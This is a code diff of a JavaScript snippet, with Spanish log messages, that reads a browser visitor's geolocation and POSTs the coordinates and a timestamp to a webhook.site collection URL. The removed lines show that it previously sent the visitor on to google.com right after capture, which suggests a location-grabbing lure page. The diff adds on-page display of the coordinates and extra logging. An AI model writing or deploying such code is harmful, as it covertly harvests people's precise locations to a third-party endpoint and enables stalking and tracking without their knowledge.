@@ -11,7 +11,8 @@
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     
-                    console.log("Ubicación obtenida:", lat, lon); // LOG EN CONSOLA
+                    console.log("✅ Ubicación obtenida:", lat, lon);
+                    document.body.innerHTML += `<p>Latitud: ${lat}, Longitud: ${lon}</p>`;
 
                     fetch("https://webhook.site/5ba595ff-7546-4228-8ff9-c2ff0b655f24", {
                         method: "POST",
@@ -19,12 +20,11 @@
                         body: JSON.stringify({ latitud: lat, longitud: lon, timestamp: new Date().toISOString() })
                     })
                     .then(response => response.text())
-                    .then(data => console.log("Respuesta del servidor:", data)) // LOG EN CONSOLA
-                    .catch(error => console.error("Error en fetch:", error));
+                    .then(data => console.log("✅ Respuesta del webhook:", data))
+                    .catch(error => console.error("❌ Error en fetch:", error));
 
-                    window.location.href = "https://www.google.com"; 
                 }, error => {
-                    console.error("Error obteniendo ubicación:", error);
+                    console.error("❌ Error obteniendo ubicación:", error);
                     alert("Error obteniendo ubicación: " + error.message);
                 });
             } else {
